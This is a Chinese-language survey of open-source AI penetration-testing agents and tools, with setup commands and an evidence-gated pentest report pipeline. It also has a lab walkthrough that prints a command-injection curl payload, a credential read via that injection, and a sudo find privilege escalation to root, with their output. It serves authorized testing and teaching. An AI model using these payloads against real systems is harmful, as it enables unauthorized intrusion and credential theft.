Offensive AI · Open Source Landscape

AI Agent 打网络，现在能用的开源东西 六大类项目清单 · 每个工具的上手用法 · 渗透报告的生成与二次利用

这份文档回答三个问题：有哪些项目的名字你会在论文和靶场里反复看到、每个怎么跑起来（含真实命令形态）、 跑完之后那份"AI 写的渗透报告"该怎么生成、怎么验证、怎么用起来。 结论先说：端到端自主渗透 agent 目前在授权项目里更适合当"侦察扩散 + 报告草稿机"，最终定性必须有人。

01 / MAP"AI 红队"其实是四件不同的事

名字混用是这块最大的认知成本。先分清你要的是哪一种，再谈选型——选错类的工具，跑多久都不会有结果。

A · AUTONOMOUS PENTEST

端到端自主渗透 Agent

给目标，自己规划 recon → 打点 → 提权 → 出报告。代表：PentestGPT、CAI、PentAGI、Strix。热度和论文都集中在这里，也是坑最集中的地方。

B · TOOL ORCHESTRATION

工具编排 / MCP 胶水层

不自己造 agent，只把 150+ 个传统工具包装成模型能调的接口。代表：HexStrike AI、Kali MCP。自建 agent 最省事的底座。

C · VULN DISCOVERY

漏洞发现与自动修复

不追求"打进去"，追求"找到 + 复现 + 打补丁"。代表：AIxCC 四套 CRS、Vulnhuntr、OSS-Fuzz-Gen。真实工程价值最高的一类。

D · EMULATION & BENCH

对抗模拟与评测基准

前者（CALDERA）提供攻击动作空间，后者（Cybench、BountyBench）提供"凭什么说我的 agent 更强"的标尺。不做评测就没法做选型。

另一条完全不同的赛道："红队 LLM 本身"（jailbreak、prompt injection、越权工具调用）是另一个领域，项目是 Garak / PyRIT / promptfoo / PurpleLlama。 它们不打网络，打的是模型。本文把它们放在最后一类，只为避免混淆。
读完先记住一句：这个方向跑得最前面的其实是闭源的 XBOW / NodeZero / Pentera / RunSybil——它们有公开靶场成绩可对照。 开源项目的价值在于「可改造 + 可审计 + 可离线」，不在于「开箱即用打赢」。

PentestGPT

研究基线

GreyDGL · USENIX Security '24

这块的开创性工作。核心洞察是"模型不会用工具"：把任务拆成推理 / 生成 / 总结三件套 + 一棵任务树，让上下文不爆。

上手
中（要配模型 key）
适合
论文 baseline、教学演示、理解任务规划
痛点
交互式、需人工粘工具输出；新版本已改成 agentic
用法示例 
# 1) 本地安装
git clone https://github.com/GreyDGL/PentestGPT && cd PentestGPT
pip install -e .

# 2) 起会话（推荐容器里跑，避免污染本机）
docker run -it --rm -v "$PWD:/work" greyhat/pentestgpt
#    镜像名以 README 为准

# 3) 会话里按阶段推进，工具输出要回填
> 目标 10.10.10.5，授权仅限该主机，先做端口与服务识别
> [粘贴 nmap 输出] 根据这些结果更新任务树，给出下一步

它就是"任务树 + 人工回填"这套范式的教科书，读懂源码比直接用它更值。

CAI — Cybersecurity AI

工程化最好

Alias Robotics · Apache-2.0

开源里抽象做得最完整的一套：agent 定义、工具注册、执行作用域、成本追踪、可接本地模型。CTF / 靶场 / 赏金 / 漏洞复现都有官方用例。

上手
中
适合
二次开发、需要离线模型的场景
痛点
抽象多，文档需要读代码补全
用法示例 
pip install cai-framework
export CAI_MODEL="alias1"        # 或指向自建 OpenAI 兼容端点
export ANTHROPIC_API_KEY=...

cai                              # 默认交互 agent

# 自己拼一个受约束的 agent
from cai.sdk.agents import Agent, run
from cai.tools.reconnaissance.generic_linux_command import generic_linux_command
from cai.tools.reconnaissance.exec_code import execute_code

agent = Agent(
    name="redteam",
    instructions="仅测试 10.10.10.0/24；每步先写推理再执行；不确定就停。",
    tools=[generic_linux_command, execute_code],
    model="alias1",
)
run(agent, "对 10.10.10.5 做端口与版本识别，输出结构化结果")

想知道"agent 框架该怎么设计"就看它，胜过看十个 demo 仓库。

hackingbuddyGPT

学术可复现

FHStP / IPA

学术味最正的一支：Linux 提权（getroot）、Web API 测试都有，且附带可复现 benchmark，论文结论能自己对一遍。

HexStrike AI

最省事的底座

0x4m4 · MCP Server

一个 MCP server 把 150+ 安全工具（nmap / ffuf / sqlmap / nuclei…）包成可调用接口，还带工具选择和参数建议。Claude、GPT、本地模型都能接。

用法示例

python3 hexstrike_server.py --port 8888 --debug            # 执行端
python3 hexstrike_mcp.py --server http://localhost:8888    # MCP 桥

// 客户端 mcp 配置
{
  "mcpServers": {
    "hexstrike-ai": {
      "command": "python3",
      "args": ["/abs/path/hexstrike_mcp.py", "--server", "http://localhost:8888"],

Vulnhuntr

最能落地

Protect AI

LLM 做 Python 零样本 SAST，但只报"可远程触达"的洞：从入口点反向追调用链，把大量不可达告警直接去掉。思路值得抄。

上手
低
适合
Python 项目上线前扫一遍、写报告引用
痛点
仅 Python；大仓库 token 成本高
用法示例 
pip install vulnhuntr
export ANTHROPIC_API_KEY=...

vulnhuntr -r /path/to/repo -a claude -l DEBUG

它的输出结构（漏洞位置 + 调用链 + 为什么可达）就是一份好的 finding 模板，可直接搬进报告 schema。

OSS-Fuzz-Gen

Google

Google · 与 OSS-Fuzz 集成

用 LLM 自动为项目生成 / 迭代 fuzz target 和 seed，提升覆盖率。属于"AI 放大传统手段"，副作用小、收益真实。

上手

适合
C/C++ 库的长期漏洞挖掘
痛点

用法示例 
# 概念流程（非直接可运行）：
# 1. 提供项目名 + 目标函数签名
# 2. LLM 生成 fuzz harness 源码
# 3. 自动 build + 跑覆盖率 + 反馈迭代
# 4. 覆盖率不涨就重新生成

这类"窄而深"的用法，比端到端 agent 更接近真实生产价值。

03 / REPORT PIPELINE从 agent 日志到一份能交付的渗透报告

这是 agent 项目最容易糊弄过去的一段：生成很便宜，可信很贵。核心矛盾是——模型天生擅长把推测写成既定事实， 而报告的法律与工程价值 100% 来自「每条结论都能指回一条原始证据」。所以下面这套流水线的重点不是让模型写得更好看， 而是让它在没有证据时写不出来。

3.1 流水线：九步，而不是"让模型写个报告"

采集nmap / nuclei / ffuf / 浏览器 / agent shell 的原始 stdout 与 HTTP 报文，全部落盘
归一化转成统一 artifact 记录：类型、来源工具、时间戳、目标、内容哈希
抽取LLM 按严格 schema 输出候选 finding，只允许引用已有 artifact id
证据绑定校验每个 evidence_id 存在且哈希一致；不一致即降级
复现回放PoC 在隔离环境重放，成功才可标 confirmed
定级CVSS 向量由模型给、分数由代码算；再叠加业务影响
去重合并同根因合并，保留最强证据；跨资产同类问题聚合
人审高危与"业务影响"结论必须人签，标注审核人
渲染交付同一份数据出三套：执行摘要 / 技术复现 / 修复工单
为什么不能跳过 4 和 5：一份标了 "confirmed" 但复现不出来的高危漏洞，在客户那边造成的信任损失，比漏报十个洞更大。宁可写 "hypothesis（待人工验证）"，也不要虚标。

3.2 Finding 的字段：先定 schema，再谈生成

下面这套字段是对 Vulnhuntr 输出结构与 BountyBench 三阶段评分的折中，够用且能被自动校验。

字段类型谁产生规则（不能妥协的部分）
id字符串系统分配后永不变更，跨轮次复用（回归时靠它对账）
asset字符串系统必须是 host / URL / repo@commit，禁止自然语言描述
confidence枚举闸门计算confirmed / likely / hypothesis；模型无权自封 confirmed
evidence_ids字符串数组模型选、系统验每个 id 必须真实存在且内容哈希匹配
cvss_vector字符串模型给只要向量，分数由代码算；模型直接给分数一律丢弃
attack_path有序数组模型只允许写「做了什么 → 观察到什么」，不允许写「可能可以」
poc字符串模型生成、系统回放可执行的 curl / python / nuclei 模板
remediation字符串模型 + 人必须指向具体组件或代码位置，禁止「加强安全意识」这类废话
retest枚举系统open / fixed / regressed / n/a

3.3 五道闸门：把幻觉挡在交付之前

  1. 1
    Schema 闸门

    结构化输出（JSON schema / pydantic）+ 严格模式。不合规直接拒收重试，不做「尽力解析」——宽松解析是幻觉的温床。

  2. 2
    证据闸门

    每条陈述必须挂 evidence_id。挂不上的不删除，而是降级成 hypothesis 并显式标注「未验证线索」——保住线索，也保住诚实。

  3. 3
    复现闸门

    标 confirmed 的前提是 PoC 在干净环境里重放成功，且有第二次成功的记录。一次成功可能是缓存、可能是残留会话。

  4. 4
    定级闸门

    CVSS 分数只从向量计算得出，模型不参与算术。业务影响另起字段，由人补——那是人的判断，不是模型的。

  5. 5
    人审闸门

    高危 / Critical、以及任何「影响客户数据」的表述必须人工签字。报告里记录审核人与审核时间，这既是质量也是责任边界。

3.4 生成骨架（示意代码）

下面的代码只演示结构：结构化输出 → 证据校验 → 定级计算。真实项目里把 store 换成你的 artifact 数据库。

# 骨架示例，非可直接运行
import hashlib
from typing import Literal
from pydantic import BaseModel

class Evidence(BaseModel):
    id: str
    kind: Literal["http", "stdout", "file"]
    ref: str          # 原始日志中的定位串
    sha256: str       # 与 ref 内容绑定，防后期改写

class Finding(BaseModel):
    id: str
    title: str
    asset: str
    cwe: str | None = None
    cvss_vector: str | None = None
    confidence: Literal["confirmed", "likely", "hypothesis"] = "hypothesis"
    evidence_ids: list[str] = []
    attack_path: list[str] = []
    poc: str | None = None
    remediation: str = ""

# 闸门 4：分数只能由向量算出
def severity_from_vector(vector: str) -> str:
    score = cvss4_score(vector)      # 引入 cvss 计算库
    if score >= 9.0: return "critical"
    if score >= 7.0: return "high"
    if score >= 4.0: return "medium"
    if score > 0.0:  return "low"
    return "info"

# 闸门 2：证据对不上就降级，不删除
def gate(f: Finding, store: dict[str, Evidence]) -> Finding:
    valid = [e for e in f.evidence_ids if e in store]
    if len(valid) != len(f.evidence_ids) or not valid:
        f.confidence = "hypothesis"
        f.attack_path.append("【未验证】原始证据缺失或被改写")
    f.evidence_ids = valid
    return f

3.5 同一条 finding，三种受众三套写法

这是报告"有用性"的关键：老板要一句话，工程师要能复现，运维要能直接派单。用同一份数据渲染三次，不要写三份。

示例：订单接口越权（IDOR）

F-007 · High · 已复现 · 涉及客户数据

一句话：登录用户可读取其他客户的订单详情，包含姓名、地址、手机号。已在测试环境复现，无需特殊权限，只要有任意有效账号。

  • 业务风险：涉及个人身份信息，命中隐私合规的高风险条款；若有自动化脚本可批量遍历，属于「可规模化泄露」。
  • 建议优先级：本次唯一建议在 72 小时内修复的项。
  • 为什么可信：附两次独立复现记录与原始 HTTP 报文，非扫描推测。

管理层视图不出现URL、payload、CWE 编号。出现即失焦。

F-007 · CWE-639 · CVSS:4.0/AV:N/AC:L/PR:L/UI:N/… · confidence=confirmed

3.6 一次完整跑通的最小流程

把上面五步串成命令链。report.py 是你自己写的那层胶水，不是现成工具——这块目前没有开箱即用的开源方案，只能自己拼。

# ① 采集：扫描器统一输出 jsonl，原始文件不可篡改地落盘
nuclei -l targets.txt -severity low,medium,high,critical -jsonl -o artifacts/raw/nuclei.jsonl

# ② 抽取：模型按严格 schema 输出候选 finding（只允许引用已有 artifact）
python report.py extract --artifacts artifacts/ --out findings.json \
    --schema schema/finding.schema.json --strict

# ③ 闸门：证据校验 + CVSS 算术 + 定级，不通过就降级成 hypothesis
python report.py gate --findings findings.json --store artifacts/ --out gated.json

# ④ 复现：在隔离环境重放 PoC，两次成功才给 confirmed
python report.py replay --findings gated.json --sandbox docker://replay-runner --repeat 2

# ⑤ 渲染：同一份数据出三套视图
python report.py render --findings gated.json --out dist/ --views exec,tech,ticket

关键在第 ③ 步：闸门应该是独立的、确定性的代码，不能又是一次模型调用——用模型去检查模型，等于没检查。

LLM 在报告环节最容易犯的错：叙事化。它会把「nmap 看到 22 端口开着」写成「存在 SSH 弱口令风险」，把推测包装成结论。 唯一有效的对抗手段是形式约束（必须引用证据 id），而不是在提示词里写「请不要幻觉」——后者基本无效。

04 / WHAT THE REPORT IS FOR报告生成之后，才是它开始干活的时候

很多团队把报告当交付终点：PDF 一发，项目结案。实际上它是五条不同流程的输入源。下面每条都给出「怎么落」而不是「应该做」。

① 客户交付与复测

  • 时间盒：高危 72 小时、中危 30 天、低危下一迭代。写进报告首页，别写进附录。
  • 复测对照：用固定 id 对账，输出「已修复 / 未修复 / 回归」三态表，而不是重新写一份报告。
  • 差额说明：新发现的洞必须单独成节，否则客户会怀疑你在凑数。

② 工单化（Jira / Linear / 飞书）

  • 一条 finding 一张单，标题用「现象 + 组件」，不用 CVE 编号做主标题。
  • 字段映射：severity → 优先级，asset → 组件，remediation → 描述，poc → 复现步骤。
  • 幂等：用 id 做去重键，避免每轮渗透都重复建单。

③ 检测工程（蓝队验证）

  • 把 finding 的攻击行为翻成检测规则：Sigma / KQL / EDR 查询。
  • 然后用同一套 attacker 在靶场回放，看规则是否触发——这就是紫队闭环。
  • 价值：红队报告从「一次性交付」变成「检测覆盖率的增量」。

④ 合规映射

  • 等保 2.0 控制项、ISO 27001 A.8、PCI-DSS 6.3、SOC 2 CC7。
  • 报告里加一列「对应控制项」，审计时直接引用，不用重新解释。
  • 注意：映射是解释，不是背书——别把「做了渗透测试」写成「已合规」。

⑤ 固化成回归用例

  • 能写成 nuclei 模板的就写模板；业务逻辑洞写成 pytest / 集成测试。
  • 目标是下次不用 agent 重新发现，CI 里 30 秒跑完。
  • 这一步做完，报告才真正降低了边际成本。

⑥ 反哺 agent 评测

  • 把历史 finding 做成私有 benchmark，比 Cybench 更贴近你的业务。
  • 指标：confirmed 占比 = 复现率，直接衡量 agent 的幻觉水平。
  • 再加两项：人类干预次数、每洞 token 成本。三项一起看才不会被刷分骗。
闭环指标怎么算：复现率 = confirmed ÷（confirmed + hypothesis）。这个数字低于 0.6 时，报告的「高危」标签基本不可信，先把闸门 3（复现回放）补上，而不是加更多 prompt。

报告环节的常见失败模式

症状根因处置
报告中出现「可能存在」类措辞，客户拒收缺证据绑定，模型自由发挥加证据闸门，无 id 一律降级并标「待验证」
高危一大堆，实际都被拒定级沿用模型给的分数改为向量计算 + 人审，业务影响单独字段

05 / WALKTHROUGH实战案例：一台机器打到 root，三个工具各管一段

把 PentestGPT、hackingbuddyGPT、Cybench 串成一条真实链路：前两个负责"打"，第三个负责"证明你打得怎么样"。 靶场是我现搭的 Docker 环境，下面的攻击链命令与回显都在本机实跑过；两个 agent 的会话输出标注为「示例」，因为它们需要 API key 与联网，我没有替你跑。

三个工具，三段不重叠的能力

  • PentestGPT · 规划 把模糊目标拆成有序动作，维持一棵任务树，提醒你别漏面。它不执行、不扫描，是副驾驶。
  • hackingbuddyGPT · 执行窄任务 给定低权凭据，自主尝试提权，每步给解释。任务边界清晰，所以它最可靠。
  • Cybench · 定标 40 道 CTF 题给出分布分数，回答"这次成功是不是运气"。

场景与边界（写在最前面）

  • 目标：自建容器 redlab-target，监听 8080（Node 写的"联通性检测"服务）与 22（sshd）。
  • 授权：仅限本机 Docker 网络内的这台容器，测试窗口 30 分钟。
  • 禁止：任何形式的对外扫描、DoS、持久化后门。
  • 产出：3 条 finding + 1 条完整提权链，按上一章的 schema 落地。

#   Priority 3  后渗透 —— 仅在有 shell 后展开

> 8080 上有个 /ping?host= 的接口，帮我想这类接口的测试点
# 输出假设清单：SSRF / 命令注入 / 参数污染 / 时间盲注

它给出的「命令注入」假设，用一条 curl 就能证伪或证实——这一步人工做比让 agent 做快得多 实测：

curl -s 'http://10.0.0.10:8080/ping?host=127.0.0.1;id'

# 真实回显
uid=1002(web) gid=1002(web) groups=1002(web)

到这里 F-001 就可以标 confirmed 了：有原始请求、有原始响应、有两次复现。注意这一步不需要 agent——它是假设的验证者，不是验证本身。

顺手把 RCE 当读取原语，翻 home 目录 实测：

curl -s 'http://10.0.0.10:8080/ping?host=x;cat%20/home/web/.deploy.sh'

# 真实回显（已滤掉 ping 报错噪音）
#!/bin/bash
sshpass -p dev123 ssh dev@10.0.0.5 uptime

这一步是整条链的关键：注入本身只是"能执行"，而凭据泄露把它变成了"能横向"。PentestGPT 的任务树会提示"Priority 2 凭据"，但它不会告诉你去翻哪个文件——那是人根据经验加的。

5.4 阶段 B · hackingbuddyGPT：拿到凭据之后交给它

这一步是三者里最适合自动化的：目标明确（root）、边界清晰（一台主机）、有客观成功标准（id 输出 root）。 

pip install hackingbuddyGPT

python3 -m hackingbuddyGPT.getroot_linux \
  --host 10.0.0.10 --username dev --password dev123 \
  --enable_explanation
# 参数名以仓库 README 为准；--enable_explanation 让它每步给出理由

它跑起来是"观察 → 假设 → 执行 → 修正"的循环，典型输出形态 示例输出：

[Turn 1] 观察：确认身份与权限边界
  $ id && uname -a && sudo -l
  -> sudoers 允许 (ALL) NOPASSWD: /usr/bin/find

[Turn 2] 假设：find 可执行任意命令，属 GTFOBins 提权
  $ sudo find . -exec /bin/sh -p \; -quit
  -> uid=0(root)

[Turn 3] 验证：读取受保护文件确认影响面
  $ cat /root/flag.txt
  -> FLAG{gtfobins_find_to_root}

上面这三条命令我在容器里原样跑过，回显一致 实测：

docker exec -u dev redlab-target bash -lc 'sudo -l'
# User dev may run the following commands on netcheck:
#     (ALL) NOPASSWD: /usr/bin/find

docker exec -u dev redlab-target bash -lc 'sudo find / -maxdepth 0 -exec /bin/sh -c "id; cat /root/flag.txt" \; -quit'
# uid=0(root) gid=0(root) groups=0(root)
# FLAG{gtfobins_find_to_root}
两个实操细节：① 很多提权工具只接受 --host，不吃非标准端口——把容器 22 映射到宿主 22，或在 ~/.ssh/config 里配别名（Host lab + Port 28022）再让工具连 lab。 ② 确认 sshd 真的开了密码登录：ssh -o BatchMode=yes -p 28022 dev@host true 若返回 Permission denied (publickey,password) 就说明密码通道存在，工具能上。

5.5 阶段 C · Cybench：给"这次成功"定个标

前三步只证明了 n=1。想回答"这套组合是稳定有效还是碰巧"，只有基准能给。 

# 路线一：Cybench 自带 harness（会拉 CTF 环境容器，需要 Docker）
git clone https://github.com/andyzorigin/cybench && cd cybench
uv sync        # 或 pip install -e .
export OPENAI_API_KEY=...
python -m cybench.run --model gpt-4o --subset web

# 路线二：走 Inspect AI（更适合接自有模型/自建端点）
pip install inspect-ai
inspect eval inspect_evals/cybench --model anthropic/claude-sonnet-4 --limit 5

用法示意 参数名随版本变动，以仓库 README 为准。先用 --limit 5 跑通链路，再放开全量。

看什么怎么读为什么重要
unguided / guided 分差同一题给 hint 后是否明显提升差值大 = 工具与接口问题；都低 = 模型能力问题。诊断方向完全不同
单任务 token 成本总 token ÷ 通过题数决定这套东西能不能进日常，而不是只做 Demo
超时 / 卡死率跑到步数上限仍未收敛的比例真实项目里"卡住"比"失败"更贵，占着窗口不产出
失败任务的形态是没找到洞，还是找到了没打通后者说明该加执行层（如 hackingbuddyGPT），前者说明该加侦察

成本量级：40 题、每题多轮工具调用，属于「几十万 token + 1~3 小时机器时间」这一档。所以实践上只用它做版本闸门（换模型、换 prompt、换工具层时各跑一次），不要每改一行就跑全量。

5.7 复盘：哪一步真的省了时间

环节谁干的耗时结论
侦察与接口枚举PentestGPT + 人工回填~20 min它负责不漏面，人负责判断哪个面值得花时间
注入假设 → 验证PentestGPT 提假设，curl 验证~3 min这类"一条命令能证伪"的事，别交给 agent 兜圈子
凭据横向人工（经验驱动）~5 minagent 不会主动想到"翻 home 里的脚本"，这是人的价值
提权hackingbuddyGPT~10 min / 若干轮三段里最适合自动化的，边界清晰、成功标准客观
定标Cybench1~3 h不是每次都跑，只在换模型/换工具层时跑一次当闸门
这次案例真正的结论：三个工具里，只有 hackingbuddyGPT 的产出直接可用；PentestGPT 的价值在"不漏面"和"给假设清单"；Cybench 的价值在"防止你被单次成功骗到"。 把所有环节都交给 agent 的团队，通常在第 3 步（凭据横向）就停住了——因为那一步的输入是人的经验，不是扫描结果。

06 / CHOOSE按你的目的选，别按热度选

同一个问题「该用哪个」有四种答案，取决于你要的是演示、研究、生产还是合规。

GOAL · 一周内跑通 demo

HexStrike AI + 任一模型

或直接 PentAGI 起一套。别自己写工具 wrapper，90% 的工程量在那里。

GOAL · 做研究 / 写论文

PentestGPT + hackingbuddyGPT + Cybench

前者当 baseline，中者提供可复现场景，后者出分。三者缺一，reviewer 会问。

GOAL · 真实授权项目

Vulnhuntr / AIxCC CRS 类窄而深工具

agent 只负责侦察扩散与报告草稿，定性与定级留给人。端到端自主渗透暂不进生产。

GOAL · 自建内部平台

CAI 或自研 + HexStrike 工具层

要的是可审计：作用域限制、每次工具调用留痕、成本可计量。这三点比模型强弱更重要。

三条红线（这几类工具特别容易踩）：
① 只在有书面授权的目标上运行；赏金项目严格守 scope 文件，越界一次就是违规而不是失误。
② 优先选自带沙箱与作用域限制的（PentAGI、CAI、Strix 有容器隔离），裸跑 agent 打生产环境是事故高发区；
③ 报告与日志里可能含真实凭据与个人数据，artifact 库要单独加密与留存期限管理，别直接扔进公共对象存储。
